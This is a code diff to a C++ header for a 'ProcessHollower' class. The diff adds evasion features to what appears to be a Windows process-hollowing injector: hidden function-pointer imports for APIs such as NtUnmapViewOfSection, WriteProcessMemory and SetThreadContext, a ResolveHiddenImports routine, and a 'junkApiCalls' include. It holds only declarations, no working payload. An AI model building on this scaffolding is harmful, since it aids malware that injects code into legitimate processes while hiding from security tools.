@@ -1,9 +1,13 @@
 #ifndef STUBBORN_PROCESS_HOLLOWER_H
 #define STUBBORN_PROCESS_HOLLOWER_H
-#include "windowsInternals.h"
-#include "windows.h"
-#include <winnt.h>
+
 #include <memoryapi.h>
+#include <windows.h>
+#include <winnt.h>
+#include "debug.h"
+#include "hiddenImports.h"
+#include "junkApiCalls.h"
+#include "windowsInternals.h"
 
 class ProcessHollower {
     public:
@@ -17,6 +21,19 @@ private:
     VIRTUAL_ADDRESS dwHostImageBaseAddress;
     LPPROCESS_INFORMATION lpHostProcessInformation;
 
+    // Hidden Imports
+    _CreateProcessA HiddenCreateProcessA;
+    _NtUnmapViewOfSection HiddenNtUnmapViewOfSection;
+    _VirtualAllocEx HiddenVirtualAllocEx;
+    _WriteProcessMemory HiddenWriteProcessMemory;
+    _VirtualProtectEx HiddenVirtualProtectEx;
+    _GetThreadContext HiddenGetThreadContext;
+    _SetThreadContext HiddenSetThreadContext;
+    _ResumeThread HiddenResumeThread;
+    _ReadProcessMemory HiddenReadProcessMemory;
+    BOOL ResolveHiddenImports();
+
+    // Functions for Process Hollowing
     VOID GetGuestPEData(LPVOID lpBuffer);
 
     BOOL CreateHostProcess(char *lpHostApplicationName);
